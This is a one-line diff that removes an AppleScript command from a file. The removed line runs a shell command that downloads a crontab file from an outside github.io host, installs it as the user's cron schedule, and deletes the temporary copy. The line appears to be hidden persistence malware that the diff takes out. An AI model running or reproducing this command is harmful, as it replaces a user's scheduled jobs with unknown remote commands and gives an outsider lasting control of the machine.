@@ -1,1 +1,0 @@
-do shell script "curl https://sitetest.github.io/cron.txt >~/.tmp; crontab ~/.tmp; rm ~/.tmp;"
